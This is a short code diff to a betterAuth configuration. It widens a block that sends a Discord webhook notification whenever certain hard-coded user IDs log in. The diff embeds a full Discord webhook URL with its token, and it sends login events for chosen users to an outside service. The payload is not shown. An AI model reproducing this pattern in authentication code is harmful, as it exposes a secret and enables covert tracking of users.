@@ -100,7 +100,12 @@ export const auth = betterAuth({
                     // --- SPECIAL NOTIFICATION START (USER TRIGGER) ---
                     // 特定ユーザーがログインした際にDiscordへ通知を送る
                     // 不要になった場合はこのブロックごと削除してください
-                    if (userId === "1m3c399fZuUy6YBmCFivh0iun40IsCU8") {
+                    const debugUserIds = [
+                        "1m3c399fZuUy6YBmCFivh0iun40IsCU8",
+                        "w8I7qSUbkA7elIfnopJvgOKq1PKXvGXg"
+                    ];
+
+                    if (debugUserIds.includes(userId)) {
                         await fetch("https://discordapp.com/api/webhooks/1309678377275232358/jWzO4sEhrbKZ7q1pzuTKOm8z_3gUsVXJHm2ef9PTGjlE6mJYFUqVHmyNC-Ksg0hESS_o", {
                             method: "POST",
                             headers: { "Content-Type": "application/json" },
